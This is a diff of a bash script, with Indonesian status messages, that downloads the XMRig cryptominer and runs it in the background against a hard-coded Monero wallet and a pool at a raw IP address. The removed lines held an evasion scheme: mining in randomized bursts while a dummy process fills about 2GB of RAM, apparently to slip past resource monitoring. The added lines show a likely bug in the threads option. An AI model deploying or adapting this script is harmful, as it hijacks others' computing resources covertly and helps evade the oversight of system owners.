@@ -1,74 +1,29 @@
 #!/bin/bash
 
 WALLET="85RHM6oH1kNgb9LaRAsVUQfeU777L229UT5U4FABNBP49VCfDRjEJkFZcSBdDsmkvnKhPk3M7kwbzZGaHtQvWxb56gDqxGN"
-WORKER="FOMO1"
+WORKER_NAME="FOMO2"
 POOL="47.84.66.172:69"
 XMRIG_VERSION="6.21.1"
 XMRIG_DIR="$HOME/xmrig-$XMRIG_VERSION"
-XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/xmrig-$XMRIG_VERSION-linux-x64.tar.gz"
 XMRIG_TAR="xmrig-$XMRIG_VERSION-linux-x64.tar.gz"
-LOG="$HOME/xmrig.log"
+XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/$XMRIG_TAR"
+LOG_FILE="$HOME/xmrig.log"
 
-install_xmrig() {
-  if [ ! -d "$XMRIG_DIR" ]; then
-    echo "Mengunduh XMRig..."
+cd ~
+if [ ! -d "$XMRIG_DIR" ]; then
+    echo " Mengunduh XMRig versi $XMRIG_VERSION..."
     curl -LO "$XMRIG_URL"
     tar -xf "$XMRIG_TAR"
-    rm "$XMRIG_TAR"
-  fi
-}
+    rm -f "$XMRIG_TAR"
+    echo " XMRig berhasil diunduh dan diekstrak ke $XMRIG_DIR"
+else
+    echo " XMRig sudah tersedia di $XMRIG_DIR"
+fi
 
-start_mining() {
-  echo "⛏ Menjalankan XMRig..."
-  nohup "$XMRIG_DIR/xmrig" -o $POOL -u $WALLET -p $WORKER -a rx/0 --tls --threads=4 > "$LOG" 2>&1 &
-  MINER_PID=$!
-}
+cd "$XMRIG_DIR"
+echo " Menjalankan XMRig di background dengan nohup..."
+nohup ./xmrig -o $POOL -u $WALLET -p $WORKER_NAME -a rx/0 --tls --threads= 8 > "$LOG_FILE" 2>&1 &
 
-stop_mining() {
-  echo "🛑 Menghentikan XMRig (PID: $MINER_PID)..."
-  kill "$MINER_PID" 2>/dev/null
-}
 
-start_ram_dummy() {
-  echo "📦 Mengisi RAM ~2GB langsung di memori..."
-  perl -e '$x = "a" x (2 * 1024 * 1024 * 1024); sleep 300' &
-  RAM_PID=$!
-}
-
-stop_ram_dummy() {
-  echo "🧹 Menghapus dummy RAM dan kill proses (PID: $RAM_PID)..."
-  kill "$RAM_PID" 2>/dev/null
-}
-
-main_loop() {
-  install_xmrig
-
-  while true; do
-    echo "🔁 Memulai siklus baru (50 menit)..."
-    START_TIME=$(date +%s)
-
-    start_ram_dummy
-    start_mining
-    sleep $((RANDOM % 120 + 240)) # 4–6 menit
-
-    stop_mining
-    sleep $((RANDOM % 60 + 120))  # 2–3 menit
-
-    start_mining
-    sleep $((RANDOM % 60 + 120))  # 2–3 menit
-
-    stop_mining
-    sleep $((RANDOM % 60 + 300))  # 5–6 menit
-
-    stop_ram_dummy
-
-    ELAPSED=$(( $(date +%s) - START_TIME ))
-    REMAINING=$((3000 - ELAPSED)) # 50 menit = 3000 detik
-    if [ "$REMAINING" -gt 0 ]; then
-      echo "⏳ Menunggu $REMAINING detik sebelum siklus selanjutnya..."
-      sleep "$REMAINING"
-    fi
-  done
-}
-
-main_loop
+echo " XMRig berjalan di background"
+echo " Log bisa dilihat di: $LOG_FILE"
